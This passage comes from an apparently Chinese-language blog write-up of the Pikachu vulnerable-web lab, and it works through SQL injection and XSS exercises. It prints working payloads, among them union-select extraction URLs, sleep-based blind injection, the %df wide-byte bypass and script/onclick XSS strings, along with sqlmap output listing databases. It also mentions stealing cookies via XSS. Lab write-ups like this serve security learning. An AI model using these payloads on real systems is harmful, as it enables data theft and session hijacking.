注入</h2>\n<p><strong>过程</strong></p>\n<p>试报错，看具体语句</p>\n<p><img src=\"pikachu-sql-004.png\" alt=\"\"></p>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;,md5(&#x27;a&#x27;),&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;)&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>密码随便输，构造用户名 payload，注意时间注入的时候要括号起来，不然会报错：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">admin&#x27;,&#x27;admin&#x27;,&#x27;&#x27;,(select sleep(10)),&#x27;&#x27;,&#x27;&#x27;) # </span><br></pre></td></tr></table></figure>\n<p>实际上差不多数据库执行的语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">insert into a(1,2,3,4,5,6) values(&#x27; admin&#x27;,&#x27;admin&#x27;,&#x27;&#x27;,(select sleep(10)),&#x27;&#x27;,&#x27;&#x27;) # &#x27;,&#x27;md5(admin)&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;  );</span><br></pre></td></tr></table></figure>\n<p>注册成功，最后也不晓得这个注入有劳资用？而且登陆的时候检查密码也是 md5 加密一下的…</p>\n<p>然后登陆的时候，源代码还报错惹</p>\n<p>时隔几天，我突然想起来，既然可以注入那么就能时间盲注进行判断…</p>\n<hr>\n<h2 id=\"delete注入\"><a class=\"markdownIt-Anchor\" href=\"#delete注入\">#</a> delete 注入</h2>\n<p><strong>过程</strong></p>\n<p>发现删除的时候是 get 请求，参数 id，直接 sqlmap 泡一泡：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">D:\\othertools\\sqlmap-py&gt;python sqlmap.py -u http://www.pikachu.com/vul/sqli/sqli_del.php?id=57 --dbs --batch</span><br><span class=\"line\">        ___</span><br><span class=\"line\">       __H__</span><br><span class=\"line\"> ___ ___[&quot;]_____ ___ ___  &#123;1.4.9.8#dev&#125;</span><br><span class=\"line\">|_ -| . [.]     | .&#x27;| . |</span><br><span class=\"line\">|___|_  [&#x27;]_|_|_|__,|  _|</span><br><span class=\"line\">      |_|V...       |_|   http://sqlmap.org</span><br><span class=\"line\"></span><br><span class=\"line\">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class=\"line\"></span><br><span class=\"line\">[*] starting @ 10:11:16 /2020-11-04/</span><br><span class=\"line\"></span><br><span class=\"line\">[10:11:16] [INFO] resuming back-end DBMS &#x27;mysql&#x27;</span><br><span class=\"line\">[10:11:17] [INFO] testing connection to the target URL</span><br><span class=\"line\">you have not declared cookie(s), while server wants to set its own (&#x27;PHPSESSID=3q2hir937ep...ecom1vat5s&#x27;). Do you want to use those [Y/n] Y</span><br><span class=\"line\">sqlmap resumed the following injection point(s) from stored session:</span><br><span class=\"line\">---</span><br><span class=\"line\">Parameter: id (GET)</span><br><span class=\"line\">    Type: boolean-based blind</span><br><span class=\"line\">    Title: Boolean-based blind - Parameter replace (original value)</span><br><span class=\"line\">    Payload: id=(SELECT (CASE WHEN (2154=2154) THEN 61 ELSE (SELECT 6834 UNION SELECT 3017) END))</span><br><span class=\"line\"></span><br><span class=\"line\">    Type: error-based</span><br><span class=\"line\">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class=\"line\">    Payload: id=61 AND (SELECT 5347 FROM(SELECT COUNT(*),CONCAT(0x716b717671,(SELECT (ELT(5347=5347,1))),0x7162627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br><span class=\"line\"></span><br><span class=\"line\">    Type: time-based blind</span><br><span class=\"line\">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class=\"line\">    Payload: id=61 AND (SELECT 9106 FROM (SELECT(SLEEP(5)))xjCI)</span><br><span class=\"line\">---</span><br><span class=\"line\">[10:11:19] [INFO] the back-end DBMS is MySQL</span><br><span class=\"line\">web application technology: PHP, PHP 7.3.4, Apache 2.4.39</span><br><span class=\"line\">back-end DBMS: MySQL &gt;= 5.0</span><br><span class=\"line\">[10:11:19] [INFO] fetching database names</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;information_schema&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;bookstore&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;dvwa&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;edusys&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;exam&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;fresh&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;hotel&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;hy&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;hy2&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;mysql&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;news&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;pentest&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;performance_schema&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;pikachu&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;store&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;student&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;test&#x27;</span><br><span class=\"line\">[10:11:19] [INFO] resumed: &#x27;vote&#x27;</span><br><span class=\"line\">available databases [18]:</span><br><span class=\"line\">[*] bookstore</span><br><span class=\"line\">[*] dvwa</span><br><span class=\"line\">[*] edusys</span><br><span class=\"line\">[*] exam</span><br><span class=\"line\">[*] fresh</span><br><span class=\"line\">[*] hotel</span><br><span class=\"line\">[*] hy</span><br><span class=\"line\">[*] hy2</span><br><span class=\"line\">[*] information_schema</span><br><span class=\"line\">[*] mysql</span><br><span class=\"line\">[*] news</span><br><span class=\"line\">[*] pentest</span><br><span class=\"line\">[*] performance_schema</span><br><span class=\"line\">[*] pikachu</span><br><span class=\"line\">[*] store</span><br><span class=\"line\">[*] student</span><br><span class=\"line\">[*] test</span><br><span class=\"line\">[*] vote</span><br><span class=\"line\"></span><br><span class=\"line\">[10:11:19] [INFO] fetched data logged to text files under &#x27;C:\\Users\\lenovo\\AppData\\Local\\sqlmap\\output\\www.pikachu.com&#x27;</span><br></pre></td></tr></table></figure>\n<hr>\n<h2 id=\"http头注入未解决\"><a class=\"markdownIt-Anchor\" href=\"#http头注入未解决\">#</a> http 头注入（未解决）</h2>\n<p><strong>过程</strong></p>\n<p>用提示里面的账户密码后登录，显示：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">你的ip地址:127.0.0.1</span><br><span class=\"line\"></span><br><span class=\"line\">你的user agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0</span><br><span class=\"line\"></span><br><span class=\"line\">你的http accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\"></span><br><span class=\"line\">你的端口（本次连接）:tcp14766</span><br></pre></td></tr></table></figure>\n<p>说明这些头信息可能都被存进数据库了，可以进行 sql 注入</p>\n<p>用 bp 抓到的包：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /vul/sqli/sqli_header/sqli_header_login.php HTTP/1.1</span><br><span class=\"line\">Host: www.pikachu.com</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Referer: http://www.pikachu.com/vul/sqli/sqli_header/sqli_header_login.php</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 34</span><br><span class=\"line\">Origin: http://www.pikachu.com</span><br><span class=\"line\">DNT: 1</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Cookie: PHPSESSID=1h9tm55rqj71244okk7do3ch0q</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Pragma: no-cache</span><br><span class=\"line\">Cache-Control: no-cache</span><br><span class=\"line\"></span><br><span class=\"line\">username=a&amp;password=a&amp;submit=Login</span><br></pre></td></tr></table></figure>\n<p>删掉一个加单引号，没报错，用网上的 payload 也不报错，神了个奇：</p>\n<p><img src=\"pikachu-sql-005.png\" alt=\"\"></p>\n<hr>\n<h2 id=\"盲注base-on-boolean\"><a class=\"markdownIt-Anchor\" href=\"#盲注base-on-boolean\">#</a> 盲注 (base  on boolean)</h2>\n<p><strong>过程</strong></p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.pikachu.com/vul/sqli/sqli_blind_b.php</span><br><span class=\"line\">?name=lili&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class=\"line\">&amp;submit=%E6%9F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure>\n<p>正常输出：</p>\n<p><img src=\"pikachu-sql-006.png\" alt=\"\"></p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.pikachu.com/vul/sqli/sqli_blind_b.php</span><br><span class=\"line\">?name=lili&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class=\"line\">&amp;submit=%E6%9F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">您输入的username不存在，请重新输入！</span><br></pre></td></tr></table></figure>\n<p>可能是因为只能输出一个对象，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.pikachu.com/vul/sqli/sqli_blind_b.php?name=lilijmknh&#x27; union select database(), &#x27;1&#x27;=&#x27;1&amp;submit=%E6%9F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure>\n<p>爆出数据库，确定是一个对象，两个字段：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">your uid:pikachuyour email is: 1</span><br></pre></td></tr></table></figure>\n<p>爆表：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.pikachu.com/vul/sqli/sqli_blind_b.php?name=lilijmknh&#x27; union select database(), group_concat(table_name)  from information_schema.tables where table_schema = &#x27;pikachu&#x27; and &#x27;1&#x27;=&#x27;1&amp;submit=%E6%9F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><figcaption><span>uid:pikachu</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">your email is: httpinfo,member,message,users,xssblind</span><br></pre></td></tr></table></figure>\n<p>爆出字段：</p>\n<figure class=\"highlight plaintext\"><figcaption><span>email is: id,userid,ipaddress,useragent,httpaccept,remoteport</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">your email is: id,userid,ipaddress,useragent,httpaccept,remoteport</span><br></pre></td></tr></table></figure>\n<p>可以通过 group_concat () 分别输出每个字段所有的值，payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=lilijmknh&#x27; union select database(),group_concat(id) from httpinfo where &#x27;1&#x27;=&#x27;1&amp;submit=%E6%9F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">your uid:pikachuyour email is: 42,43,44,45,46,47</span><br></pre></td></tr></table></figure>\n<hr>\n<h2 id=\"盲注base-on-time未成功实现-500\"><a class=\"markdownIt-Anchor\" href=\"#盲注base-on-time未成功实现-500\">#</a> 盲注 (base on time)，未成功实现 ，500</h2>\n<p>这个就是利用二分法查 ascii 码值，手工注入的话很费时间的把</p>\n<p>靠，他根本就不关心我是谁！我要去看源码了！</p>\n<p>发现果然是盲注，不管是不是查到，都是输出 i don’t care who you are!</p>\n<p><strong>过程</strong></p>\n<p>payload，报 500 了:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.pikachu.com/vul/sqli/sqli_blind_t.php?name=&#x27; or (length(database())&gt;1 and sleep(10)) and &#x27;1&#x27;=&#x27;1&amp;submit=%E6%9F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure>\n<hr>\n<h2 id=\"宽字节注入\"><a class=\"markdownIt-Anchor\" href=\"#宽字节注入\">#</a> 宽字节注入</h2>\n<p><a href=\"https://www.cnblogs.com/Rain99-/p/10583406.html\">详解</a></p>\n<ol>\n<li>字符、字符集<br>\n字符 (character) 是组成字符集 (character set) 的基本单位。对字符赋予一个数值 (encoding) 来确定这个字符在该字符集中的位置。</li>\n<li>UTF8<br>\n 由于 ASCII 表示的字符只有 128 个，因此网络世界的规范是使用 UNICODE 编码，但是用 ASCII 表示的字符使用 UNICODE 并不高效。因此出现了中间格式字符集，被称为通用转换格式，及 UTF (Universal Transformation Format)。</li>\n<li>宽字节<br>\n GB2312、GBK、GB18030、BIG5、Shift_JIS 等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃 ASCII 字符 (一字节) 的现象，即将两个 ascii 字符误认为是一个宽字节字符。</li>\n</ol>\n<p>宽字节注入原理：</p>\n<blockquote>\n<p>GBK 占用两字节</p>\n<p>ASCII 占用一字节</p>\n<p>PHP 中编码为 GBK，函数执行添加的是 ASCII 编码（添加的符号为 “\\”），MYSQL 默认字符集是 GBK 等宽字节字符集。</p>\n<p>大家都知道 % df’ 被 PHP 转义（开启 GPC、用 addslashes 函数，或者 icov 等），单引号被加上反斜杠 \\，变成了 % df\\’，其中 \\ 的十六进制是 %5C ，那么现在  <code>%df\\’</code>  = <code>%df%5c%27</code> ，如果程序的默认字符集是 GBK 等宽字节字符集，则 MySQL 用 GBK 的编码时，会认为  <code>%df%5c</code>  是一个宽字符，也就是 <code>縗</code> ，也就是说：% df\\’ = % df%5c%27 = 縗’，有了单引号就好注入了。</p>\n</blockquote>\n<p><img src=\"https://img2018.cnblogs.com/blog/1335588/201903/1335588-20190323124156168-514841357.png\" alt=\"img\"></p>\n<p><strong>过程</strong></p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">name=%df&#x27; or 1=1 %23+&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>\n<p>所有数据输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">your uid:1your email is: eyour uid:2your email is: allen@pikachu.comyour uid:3your email is: kobe@pikachu.comyour uid:4your email is: grady@pikachu.comyour uid:5your email is: kevin@pikachu.comyour uid:6your email is: lucy@pikachu.com......</span><br></pre></td></tr></table></figure>\n<hr>\n<h1 id=\"xss\"><a class=\"markdownIt-Anchor\" href=\"#xss\">#</a> XSS</h1>\n<blockquote>\n<p>XSS 漏洞可以用来进行钓鱼攻击，前端 JS 挖矿，用户 cookie 获取。甚至可以结合浏览器自身的漏洞对用户主机进行远程控制。</p>\n</blockquote>\n<h2 id=\"反射型xssget\"><a class=\"markdownIt-Anchor\" href=\"#反射型xssget\">#</a> 反射型 xss (get)</h2>\n<h3 id=\"过程\"><a class=\"markdownIt-Anchor\" href=\"#过程\">#</a> 过程</h3>\n<p>​\t文本框下方会回显输入的内容，想输万能弹窗 <code>&lt;script&gt;alert(1);&lt;/script&gt;</code> ，发现文本框限制了字数，前端直接定位改成 100，成功</p>\n<p><img src=\"pikachu-xss-001.png\" alt=\"\"></p>\n<p>因为为 get 请求，所以输入的参数值会出现在 url 末尾</p>\n<hr>\n<h2 id=\"反射型xsspost大失败\"><a class=\"markdownIt-Anchor\" href=\"#反射型xsspost大失败\">#</a> 反射型 xss (post)（大失败）</h2>\n<p><img src=\"pikachu-xss-002.png\" alt=\"\"></p>\n<p>​\tPOST 请求区别与 GET 请求，POST 请求不能从 URL 让用户向服务器提交数据。所以为了进行注入，需要让用户代替攻击者提交 POST 请求，这就需要攻击者自己搭建站点，然后再站点内写一个 POST 表单，将我们搭建出的连接发给用户，这样就能让用户帮攻击者提交 POST 请求发给存在 XSS 漏洞的中。这样就能窃取到用户的 cookie，就能伪造用户登陆达到破坏的目的。</p>\n<h3 id=\"过程-2\"><a class=\"markdownIt-Anchor\" href=\"#过程-2\">#</a> 过程</h3>\n<p>但是这后台我没登进去呀～</p>\n<hr>\n<h2 id=\"存储型xss\"><a class=\"markdownIt-Anchor\" href=\"#存储型xss\">#</a> 存储型 xss</h2>\n<h3 id=\"过程-3\"><a class=\"markdownIt-Anchor\" href=\"#过程-3\">#</a> 过程</h3>\n<p>​\t直接搞个超链接，留言列表点击跳转</p>\n<p><img src=\"pikachu-xss-003.png\" alt=\"\"></p>\n<script>alert(1)</script> 的话，每次刷新页面都会弹窗\n<hr>\n<h2 id=\"dom型\"><a class=\"markdownIt-Anchor\" href=\"#dom型\">#</a> dom 型</h2>\n<p>click 一下，发现超链接的跳转是输入的字符串，所以直接闭合就可</p>\n<h3 id=\"过程-4\"><a class=\"markdownIt-Anchor\" href=\"#过程-4\">#</a> 过程</h3>\n<p><img src=\"pikachu-xss-004.png\" alt=\"\"></p>\n<p>尝试用双引号闭合的时候，尽然没有作用？？？</p>\n<figure class=\"highlight html\"><figcaption><span>payload</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a&quot;&gt;nhhh<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert(1)<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#</span></span></span><br></pre></td></tr></table></figure>\n<p><img src=\"pikachu-xss-005.png\" alt=\"\"></p>\n<p>全部改成单引号 <code>a'&gt;nhhh&lt;/a&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href='#</code> ：</p>\n<p><img src=\"pikachu-xss-006.png\" alt=\"\"></p>\n<p>但是 js 脚本没有生效，因为没有返回给服务器，所以刷新之后更改的也没有了，可以通过 onclick 弹窗:</p>\n<p><code>a' onclick=&quot;alert(1)&quot;&gt;nhhh&lt;/a&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href='#</code></p>\n<p><img src=\"pikachu-xss-007.png\" alt=\"\"></p>\n<hr>\n<h2 id=\"dom型xss-x\"><a class=\"markdownIt-Anchor\" href=\"#dom型xss-x\">#</a> dom 型 xss-x</h2>\n<h3 id=\"过程-5\"><a class=\"markdownIt-Anchor\" href=\"#过程-5\">#</a> 过程</h3>\n<p>随便输入 a 后点按钮，出现一个超链接，发现这个超链接有一个事件，调用了 domxss () 函数，Ctrl+F 找一下 domxss 看 js 源代码，竟然还有这种明示</p>\n<p><img src=\"pikachu-xss-008.png\" alt=\"\"></p>\n<p>直接输入：’ onclick=“alert (‘xss’)”&gt;</p>\n<p><img src=\"pikachu-xss-009.png\" alt=\"\"></p>\n<hr>\n<h2 id=\"xss之盲打\"><a class=\"markdownIt-Anchor\" href=\"#xss之盲打\">#</a> xss 之盲打</h2>\n<h3 id=\"过程-6\"><a class=\"markdownIt-Anchor\" href=\"#过程-6\">#</a> 过程</h3>\n<p>根据提示登录后台，发现有我们提交的数据（这里只能显示一个我们交的数据！气人），所以前台提交</p>\n<figure class=\"highlight html\"><figcaption><span>payload</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert(1)<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>后台就会被弹</p>\n<p>可以利用这个获取 cookie，但是我还是没有试</p>\n<p>(爱鸭，怎么能不试试呢～)</p>\n<hr>\n<h2 id=\"xss之过滤\"><a class=\"markdownIt-Anchor\" href=\"#xss之过滤\">#</a> xss 之过滤</h2>\n<h3 id=\"过程-7\"><a class=\"markdownIt-Anchor\" href=\"#过程-7\">#</a> 过程</h3>\n<p>经过多次尝试，应是过滤了 &lt; script 和前面所有字符，大小写可以绕过，也可以用<a onclick=\"alert(1)\"></a></p>\n<hr>\n<h2 id=\"xss之htmlspecialcahrs我总是以为自己没绕过\"><a class=\"markdownIt-Anchor\" href=\"#xss之htmlspecialcahrs我总是以为自己没绕过\">#</a> xss 之 htmlspecialcahrs，我总是以为自己没绕过</h2>\n<h3 id=\"过程-8\"><a class=\"markdownIt-Anchor\" href=\"#过程-8\">#</a> 过程</h3>\n<p>默认不过滤单引号</p>\n<p>payload：</p>\n<figure class=\"highlight html\"><figcaption><span>payload</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#&#x27; onclick=&#x27;alert(111)&#x27;</span><br></pre></td></tr></table></figure>\n<hr>\n<h2 id=\"xss之href输出\"><a class=\"markdownIt-Anchor\" href=\"#xss之href输出\">#</a> xss 之 href 输出</h2>\n<h3 id=\"过程-9\"><a class=\"markdownIt-Anchor\" href=\"#过程-9\">#</a> 过程</h3>\n<p>payload:</p>\n<figure class=\"highlight html\"><figcaption><span>payload</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">javascript:alert(1)</span><br></pre></td></tr></table></figure>\n<p><img src=\"pikachu-xss-011.png\" alt=\"\"></p>\n<hr>\n<h2 id=\"xss之js输出\"><a class=\"markdownIt-Anchor\" href=\"#xss之js输出\">#</a> xss 之 js 输出</h2>\n<h3 id=\"过程-10\"><a class=\"markdownIt-Anchor\" href=\"#过程-10\">#</a> 过程</h3>\n<p>看表单发现 js 有个判断，输入 tmac 会输出一张图片，直接插入 onclick=“alert (1)”</p>\n<p><img src=\"pikachu-xss-012.png\" alt=\"\"></p>\n<p><img src=\"pikachu-xss-010.png\" alt=\"\"></p>\n<p>据说可以闭合，成功弹窗</p>\n<p>payload：</p>\n<figure class=\"highlight html\"><figcaption><span>payload</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert(1)<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>闭合后的 js：</p>\n<p><img src=\"pikachu-xss-013.png\" alt=\"\"></p>\n<h2 id=\"总结\"><a class=\"markdownIt-Anchor\" href=\"#总结\">#</a> 总结</h2>\n<p><a href=\"https://blog.csdn.net/weixin_43899561/article/details/89429726\">大佬写的关于 xss 抓 cookie</a></p>\n<p><a href=\"https://www.fujieace.com/penetration-test/xss-100.html\">XSS 过滤绕过方法</a></p>\n<p><a href=\"https://www.cnblogs.com/heiwa-0924/p/12520547.html\">通关手册，写得挺好</a></p>\n<hr>\n<h1 id=\"文件包含\"><a class=\"markdownIt-Anchor\" href=\"#文件包含\">#</a> 文件包含</h1>\n<p>文件包含之看不懂自己在写什么，所以无法上传系列</p>\n<p>看样子应该就是基础的文件包含鸭～</p>\n<h2 id=\"总结-2\"><a class=\"markdownIt-Anchor\" href=\"#总结-2\">#</a> 总结：</h2>\n<p>文件包含：</p>\n<blockquote>\n<p>文件包含在 php 中，涉及到的危险函数有四个，分别是 include ()、include_once ()、require ()、require_once ()。</p>\n</blockquote>\n<p>区别如下：</p>\n<blockquote>\n<p>include：包含并运行指定的文件，包含文件发生错误时，程序警告，但会继续执行。</p>\n<p>include_once：和 include 类似，不同处在于 include_once 会检查这个文件是否已经被导入，如果已导入，下文便不会再导入，直面 once 理解就是只导入一次。</p>\n<p>require：包含并运行指定的文件，包含文件发生错误时，程序直接终止执行。</p>\n<p>require_once：和 require 类似，不同处在于 require_once 只导入一次。</p>\n</blockquote>\n<hr>\n<h1 id=\"暴力破解\"><a class=\"markdownIt-Anchor\" href=\"#暴力破解\">#</a> 暴力破解</h1>\n<h2 id=\"基于表单的爆破\"><a class=\"markdownIt-Anchor\" href=\"#基于表单的爆破\">#</a> 基于表单的爆破</h2>\n<h3 id=\"过程-11\"><a class=\"markdownIt-Anchor\" href=\"#过程-11\">#</a> 过程</h3>\n<p>​\tbp 抓包，intrude 直接爆密码，用户名 